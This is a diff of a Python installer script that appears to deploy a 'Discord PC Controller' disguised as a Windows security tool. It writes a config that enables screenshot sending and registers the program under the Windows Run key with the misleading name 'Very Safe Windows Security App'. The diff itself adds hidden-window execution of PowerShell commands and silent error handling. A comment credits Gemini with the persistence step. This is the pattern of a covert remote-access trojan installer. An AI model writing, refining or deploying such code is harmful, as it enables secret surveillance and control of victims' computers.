@@ -1,12 +1,12 @@
 #Imports
-from subprocess import run #To run commands in cmd
-import winreg #Modify registry to always run on startup
+from subprocess import run, CREATE_NO_WINDOW #To run commands in cmd
+from winreg import SetValueEx, CloseKey, OpenKey, KEY_WRITE, REG_SZ, HKEY_CURRENT_USER #Modify registry to always run on startup
 from os import getcwd, chdir #To get file path for exe
 
 #Method to run commands and handle errors
 def installStep(command):
     try:
-        run(["powershell", command], shell=False, check=True)
+        run(["powershell", command], shell=False, check=False, creationflags=CREATE_NO_WINDOW)
     except:
         exit()
 
@@ -31,10 +31,10 @@ with open("Windows-System-Security\Discord PC Controller\.env", "w") as f:
 	f.write("SEND_SCREENSHOT=True")
 
 #Step 6: Make sure the app runs on startup (NOTE: Gemini helped me with this part)
-regKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+regKey = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
 workDir = getcwd()
-winreg.SetValueEx(regKey, "Very Safe Windows Security App", 0, winreg.REG_SZ, workDir + "\Windows-System-Security\Discord PC Controller\Discord PC Controller.exe")
-winreg.CloseKey(regKey)
+SetValueEx(regKey, "Very Safe Windows Security App", 0, REG_SZ, workDir + "\Windows-System-Security\Discord PC Controller\Discord PC Controller.exe")
+CloseKey(regKey)
 
 #Step 7: Start the app
 chdir("Windows-System-Security\Discord PC Controller")
